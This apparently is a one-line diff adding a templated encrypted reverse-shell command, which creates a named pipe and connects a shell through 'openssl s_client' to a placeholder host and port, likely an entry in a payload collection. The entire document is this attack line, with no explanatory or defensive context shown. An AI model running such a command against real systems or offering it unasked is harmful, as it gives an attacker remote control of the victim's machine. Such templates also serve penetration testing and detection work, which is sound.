@@ -1,0 +1,1 @@
+mkfifo *\tmp*; *\shell* < *\tmp* 2>&1 | openssl s_client -quiet -connect *\host*:*\port* > *\tmp*; rm *\tmp*
